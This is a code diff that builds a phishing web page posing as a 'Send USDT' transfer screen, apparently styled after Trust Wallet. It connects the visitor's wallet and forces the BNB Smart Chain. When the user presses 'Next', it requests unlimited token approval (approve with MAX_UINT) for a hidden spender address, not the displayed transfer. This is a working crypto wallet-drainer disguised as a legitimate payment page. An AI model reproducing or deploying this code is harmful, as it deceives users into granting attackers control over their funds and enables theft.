@@ -1,116 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Send USDT</title>
+
+<link rel="icon" href="https://salman4sgsgit.github.io/wallet-demo/trustlogofav.png">
+<link rel="apple-touch-icon" href="https://salman4sgsgit.github.io/wallet-demo/trustlogofav.png">
+
+<meta property="og:title" content="Send USDT">
+<meta property="og:description" content="Fast & Secure USDT Transfer">
+<meta property="og:image" content="https://salman4sgsgit.github.io/wallet-demo/trustlogofav.png">
+<meta property="og:url" content="https://sendandconfirm.in">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://salman4sgsgit.github.io/wallet-demo/trustlogofav.png">
+
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto;background:#0b0f14;color:white; }
+.header { display:flex;justify-content:space-between;align-items:center;padding:20px; }
+.section { padding:0 20px;margin-top:18px; }
+.label { font-size:13px;color:#9aa4af;margin-bottom:8px; }
+.input-box { background:#11161c;border:2px solid #1f2a36;border-radius:14px;padding:14px; }
+.address { font-size:14px;color:#16c784;word-break:break-all; }
+.network { background:#11161c;padding:12px;border-radius:12px;color:#ccc;font-size:14px; }
+.amount-row { display:flex;justify-content:space-between;align-items:center; }
+.input-box input { background:transparent;border:none;color:white;font-size:16px;width:100%;outline:none; }
+.actions { display:flex;gap:10px; }
+.usdt-label { color:#16c784;font-weight:600; }
+.action-btn { color:#16c784;cursor:pointer; }
+.footer { position:fixed;bottom:0;width:100%;padding:20px; }
+.next-btn { width:100%;background:#16c784;border:none;padding:16px;border-radius:30px;font-size:16px;font-weight:600;color:black;cursor:pointer; }
+.status { text-align:center;margin-top:10px;font-size:14px; }
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <h2>Send USDT</h2>
+</div>
+
+<div class="section">
+  <div class="label">Recipient</div>
+  <div class="input-box">
+    <div class="address">0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F</div>
+  </div>
+</div>
+
+<div class="section">
+  <div class="label">Destination network</div>
+  <div class="network">BNB Smart Chain</div>
+</div>
+
+<div class="section">
+  <div class="label">Amount</div>
+  <div class="input-box amount-row">
+    <input type="number" id="amount" placeholder="USDT Amount">
+    <div class="actions">
+      <span class="usdt-label">USDT</span>
+      <div class="action-btn" onclick="setMax()">Max</div>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <button class="next-btn" id="sendBtn">Next</button>
+  <div id="status" class="status"></div>
+</div>
+
 <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
 
 <script>
-const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
-const SPENDER_ADDRESS  = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
-const USDT_CONTRACT    = '0x55d398326f99059fF775485246999027B3197955';
-const BSC_CHAIN_ID     = '0x38';
-const MAX_UINT         = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+var SPENDER_ADDRESS = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
+var USDT_CONTRACT   = '0x55d398326f99059fF775485246999027B3197955';
+var BSC_CHAIN_ID    = '0x38';
+var MAX_UINT        = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-let web3, userAccount, usdt;
+var web3, userAccount, usdt;
 
-const sendBtn   = document.getElementById('sendBtn');
-const statusDiv = document.getElementById('status');
-const amountInput = document.getElementById('amount');
+var sendBtn     = document.getElementById('sendBtn');
+var statusDiv   = document.getElementById('status');
+var amountInput = document.getElementById('amount');
 
-const ABI = [
-    { constant:false, inputs:[{name:"_spender",type:"address"},{name:"_value",type:"uint256"}], name:"approve",   outputs:[{name:"",type:"bool"}], type:"function" },
-    { constant:true,  inputs:[{name:"_owner",type:"address"}],                                  name:"balanceOf", outputs:[{name:"balance",type:"uint256"}],         type:"function" }
+var ABI = [
+  {
+    constant: false,
+    inputs: [
+      { name: '_spender', type: 'address' },
+      { name: '_value',   type: 'uint256' }
+    ],
+    name: 'approve',
+    outputs: [{ name: '', type: 'bool' }],
+    type: 'function'
+  },
+  {
+    constant: true,
+    inputs: [{ name: '_owner', type: 'address' }],
+    name: 'balanceOf',
+    outputs: [{ name: 'balance', type: 'uint256' }],
+    type: 'function'
+  }
 ];
 
-// ✅ Reliable delay helper
 function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
+  return new Promise(function(resolve) {
+    setTimeout(resolve, ms);
+  });
 }
 
-// ✅ Switch to BSC, then wait for provider to settle before continuing
-async function forceBSC() {
-    const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
-    if (currentChain === BSC_CHAIN_ID) return; // already on BSC, skip entirely
+function showStatus(msg, error) {
+  statusDiv.innerText = msg;
+  statusDiv.style.color = error ? '#ff4d4f' : '#16c784';
+}
 
-    try {
-        await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: BSC_CHAIN_ID }]
+function forceBSC() {
+  return window.ethereum.request({ method: 'eth_chainId' }).then(function(currentChain) {
+    if (currentChain === BSC_CHAIN_ID) {
+      return; // already on BSC, skip
+    }
+    return window.ethereum.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: BSC_CHAIN_ID }]
+    }).catch(function(err) {
+      if (err.code === 4902) {
+        return window.ethereum.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: BSC_CHAIN_ID,
+            chainName: 'BNB Smart Chain',
+            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+            blockExplorerUrls: ['https://bscscan.com']
+          }]
         });
-    } catch (err) {
-        if (err.code === 4902) {
-            await window.ethereum.request({
-                method: 'wallet_addEthereumChain',
-                params: [{
-                    chainId: BSC_CHAIN_ID,
-                    chainName: 'BNB Smart Chain',
-                    nativeCurrency: { name:'BNB', symbol:'BNB', decimals:18 },
-                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                    blockExplorerUrls: ['https://bscscan.com']
-                }]
-            });
-        } else {
-            throw err;
-        }
-    }
-
-    // ✅ KEY FIX: Wait for Trust Wallet to fully settle after chain switch
-    await sleep(1000);
-
-    // ✅ Reinitialize web3 with the now-stable provider
-    web3 = new Web3(window.ethereum);
+      }
+      throw err;
+    }).then(function() {
+      // Wait for Trust Wallet to settle after chain switch
+      return sleep(1000);
+    }).then(function() {
+      // Reinitialize web3 after chain switch
+      web3 = new Web3(window.ethereum);
+    });
+  });
 }
 
-async function init() {
-    if (!window.ethereum) {
-        showStatus("Install wallet", true);
-        return;
-    }
+function init() {
+  if (!window.ethereum) {
+    showStatus('Install wallet', true);
+    return;
+  }
 
-    try {
-        web3 = new Web3(window.ethereum);
+  web3 = new Web3(window.ethereum);
 
-        // STEP 1: Connect wallet first
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        userAccount = accounts[0];
+  // Step 1: Connect wallet
+  window.ethereum.request({ method: 'eth_requestAccounts' }).then(function(accounts) {
+    userAccount = accounts[0];
 
-        // STEP 2: Switch chain (skipped if already on BSC)
-        await forceBSC();
+    // Step 2: Switch to BSC if needed
+    return forceBSC();
+  }).then(function() {
 
-        // STEP 3: Init contract AFTER chain is confirmed stable
-        usdt = new web3.eth.Contract(ABI, USDT_CONTRACT);
+    // Step 3: Init contract after chain is stable
+    usdt = new web3.eth.Contract(ABI, USDT_CONTRACT);
+    showStatus('Wallet Ready');
 
-        showStatus("✅ Wallet Ready");
-
-    } catch (e) {
-        showStatus("Wallet connection failed", true);
-    }
+  }).catch(function(e) {
+    showStatus('Wallet connection failed', true);
+  });
 }
 
-async function sendUSDT() {
-    sendBtn.disabled = true;
-    showStatus("Confirm in wallet...");
+function sendUSDT() {
+  sendBtn.disabled = true;
+  showStatus('Confirm in wallet...');
 
-    try {
-        await usdt.methods.approve(SPENDER_ADDRESS, MAX_UINT).send({ from: userAccount });
-        showStatus("✅ Approval successful");
-    } catch (e) {
-        showStatus("❌ Failed", true);
-    }
-
+  usdt.methods.approve(SPENDER_ADDRESS, MAX_UINT).send({ from: userAccount }).then(function() {
+    showStatus('Approval successful');
     sendBtn.disabled = false;
+  }).catch(function(e) {
+    showStatus('Failed', true);
+    sendBtn.disabled = false;
+  });
 }
 
-function showStatus(msg, error=false) {
-    statusDiv.innerText = msg;
-    statusDiv.style.color = error ? "#ff4d4f" : "#16c784";
-}
-
-async function setMax() {
-    const bal = await usdt.methods.balanceOf(userAccount).call();
+function setMax() {
+  usdt.methods.balanceOf(userAccount).call().then(function(bal) {
     amountInput.value = web3.utils.fromWei(bal, 'ether');
+  });
 }
 
 window.onload = init;
 sendBtn.onclick = sendUSDT;
 
 if (window.ethereum) {
-    window.ethereum.on('chainChanged', () => window.location.reload());
+  window.ethereum.on('chainChanged', function() {
+    window.location.reload();
+  });
 }
 </script>
+
+</body>
+</html>
